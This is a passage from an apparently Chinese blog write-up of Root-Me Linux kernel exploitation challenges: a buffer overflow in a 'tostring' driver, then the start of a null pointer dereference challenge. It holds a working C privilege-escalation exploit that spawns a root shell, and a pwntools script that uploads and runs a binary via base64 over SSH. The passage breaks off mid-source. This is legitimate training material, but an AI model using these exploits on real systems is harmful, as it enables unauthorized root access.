<li><p>申请一块空间 =&gt; <code>bufk = kmalloc(len + 1, GFP_DMA)</code></p>
</li>
<li><p>将write函数的数据写入申请的chunk中 =&gt; <code>copy_from_user(bufk, buf, len)</code></p>
</li>
<li><p>将输入的数据拷贝到栈上 =&gt; <code>tostring.tostring_stack[tostring.pointer++]= *((long long int *) bufk);</code></p>
<ul>
<li>一次拷贝long long int，也就是八字节</li>
<li>拷贝的地址是0x8000784</li>
</ul>
<p><img src="/2021/06/05/kernel-study/image-20210603150742793.png" alt="image-20210603150742793"></p>
</li>
<li><p>释放，结束</p>
</li>
</ul>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li>程序write时候，将数据拷贝到栈上0x8000784</li>
<li>执行read函数，会执行栈上的地址0x8000984</li>
<li>所以，如果一直执行write函数，覆盖到0x8000984地址为shellcode，就可以get shell</li>
<li>距离是0x200，因为一次只能写八字节，需要循环写40次</li>
<li>然后将0x8000984地址覆盖成shellcode</li>
<li>调用read函数</li>
</ol>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Padding[<span class="number">9</span>] = <span class="string">"AAAAAAAA"</span>;			<span class="comment">//一次覆盖8字节</span></span><br><span class="line">    <span class="keyword">char</span> Eip[<span class="number">5</span>];							<span class="comment">//shellcode地址</span></span><br><span class="line">    init_tf_work();							<span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);		<span class="comment">//使用该驱动</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>; i++)			<span class="comment">//覆盖前面0x200的垃圾数据</span></span><br><span class="line">        <span class="built_in">write</span>(fd,Padding,<span class="keyword">sizeof</span>(Padding));	</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"OK!n"</span>,<span class="keyword">sizeof</span>(Eip));			<span class="comment">//友好提示</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(Eip)) = &amp;payload;			<span class="comment">//将shellocde地址写入eip</span></span><br><span class="line">    <span class="built_in">write</span>(fd,Eip,<span class="keyword">sizeof</span>(Eip));				<span class="comment">//将eip写入0x80000984</span></span><br><span class="line">    <span class="built_in">read</span>(fd,receive,<span class="number">255</span>);					<span class="comment">//执行read函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="调试信息"><a href="#调试信息" class="headerlink" title="调试信息"></a>调试信息</h5><ul>
<li>ida中bss段的起始地址是0x8000780</li>
<li>程序执行的data段起始地址是0xc8824600</li>
</ul>
<p>所以，拷贝的起始地址0x8000780在调试的时候就是0xc8824604</p>
<hr>
<p>执行一次write</p>
<p><img src="/2021/06/05/kernel-study/image-20210603152453197.png" alt="image-20210603152453197"></p>
<p>执行完40次write，再执行 write(fd,Eip,sizeof(Eip));【也就是将shellcode地址写入了0xc8824804这个地址】</p>
<p><img src="/2021/06/05/kernel-study/image-20210603152841301.png" alt="image-20210603152841301"></p>
<h4 id="question"><a href="#question" class="headerlink" title="question"></a>question</h4><blockquote>
<p>远程提权失败，也不知道为什么，，，权限是变了，但是变得很奇怪。。。</p>
<p><img src="/2021/06/05/kernel-study/image-20210604143845221.png" alt="image-20210604143845221"></p>
<p>本地ok</p>
<p><img src="/2021/06/05/kernel-study/image-20210604143951129.png" alt="image-20210604143951129"></p>
<p><img src="/2021/06/05/kernel-study/image-20210604144004010.png" alt="image-20210604144004010"></p>
</blockquote>
<h5 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(log_level='debug')</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"challenge03.root-me.org"</span></span><br><span class="line">PORT =  <span class="number">2223</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"app-systeme-ch1"</span></span><br><span class="line">PW = <span class="string">"app-systeme-ch1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span><span class="params">()</span>:</span></span><br><span class="line">    log.info(<span class="string">"Compile"</span>)</span><br><span class="line">    <span class="comment"># os.system("musl-gcc -w -s -static -o3 oob.c -o exp")</span></span><br><span class="line">    os.system(<span class="string">"gcc -m32 -static -o exp poc.c"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"exp"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">"cat benc | base64 -d &gt; bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"chmod +x bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"./bout"</span>)</span><br><span class="line"></span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">"./startvm.sh"</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>

<h5 id="musl-gcc编译32位"><a href="#musl-gcc编译32位" class="headerlink" title="musl-gcc编译32位"></a>musl-gcc编译32位</h5><ul>
<li><p>gcc编译的，没用musl-gcc</p>
</li>
<li><p>musl-gcc怎么编译32位的？没有-m32参数</p>
</li>
</ul>
<h3 id="2-Root-Me-LinKern-x86-Null-pointer-dereference"><a href="#2-Root-Me-LinKern-x86-Null-pointer-dereference" class="headerlink" title="2.[Root-Me]LinKern x86 - Null pointer dereference"></a>2.[Root-Me]LinKern x86 - Null pointer dereference</h3><h4 id="下载文件-1"><a href="#下载文件-1" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern32-Null-pointer-dereference" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch2@challenge03.root-me.org</span><br><span class="line">密码:app-systeme-ch2</span><br></pre></td></tr></table></figure>

<p>拷贝文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch2@challenge03.root-me.org:/challenge/app-systeme/ch2/* .</span><br><span class="line">密码:app-systeme-ch2</span><br></pre></td></tr></table></figure>

<h4 id="分析init文件"><a href="#分析init文件" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="comment"># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>和上一题的init差不多</p>
<h4 id="分析LKMs文件-1"><a href="#分析LKMs文件-1" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>路径由init可知：<code>/lib/modules/*/rootme/*.ko</code></p>
<p><img src="/2021/06/05/kernel-study/image-20210603220411473.png" alt="image-20210603220411473"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=d55b3e2795a90b029627ae2fcc47291702c1784b, not stripped</span><br><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/nullpoint/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>同样给了源码，<code>ch2.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISSPACE(c)  ((c) == <span class="meta-string">' '</span> || ((c) &gt;= <span class="meta-string">'\t'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'\r'</span>))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISASCII(c)  (((c) &amp; ~0x7f) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISUPPER(c)  ((c) &gt;= <span class="meta-string">'A'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'Z'</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISLOWER(c)  ((c) &gt;= <span class="meta-string">'a'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'z'</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISALPHA(c)  (ISUPPER(c) || ISLOWER(c))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISDIGIT(c)  ((c) &gt;= <span class="meta-string">'0'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'9'</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">local_strtoul</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>*   nstr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>**  endptr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !(defined(__KERNEL__))</span></span><br><span class="line">    <span class="keyword">return</span> strtoul (nstr, endptr, base);    <span class="comment">/* user mode */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">char</span>* s = nstr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> acc;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cutoff;</span><br><span class="line">    <span class="keyword">int</span> neg = <span class="number">0</span>, any, cutlim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        c = *s++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ISSPACE(c));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'-'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        neg = <span class="number">1</span>;</span><br><span class="line">        c = *s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'+'</span>)</span><br><span class="line">        c = *s++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((base == <span class="number">0</span> || base == <span class="number">16</span>) &amp;&amp;</span><br><span class="line">        c == <span class="string">'0'</span> &amp;&amp; (*s == <span class="string">'x'</span> || *s == <span class="string">'X'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        c = s[<span class="number">1</span>];</span><br><span class="line">        s += <span class="number">2</span>;</span><br><span class="line">        base = <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (base == <span class="number">0</span>)</span><br><span class="line">        base = c == <span class="string">'0'</span> ? <span class="number">8</span> : <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    cutoff = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ULONG_MAX / (<span class="keyword">unsigned</span> <span class="keyword">long</span>)base;</span><br><span class="line">    cutlim = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ULONG_MAX % (<span class="keyword">unsigned</span> <span class="keyword">long</span>)base;</span><br><span class="line">    <span class="keyword">for</span> (acc = <span class="number">0</span>, any = <span 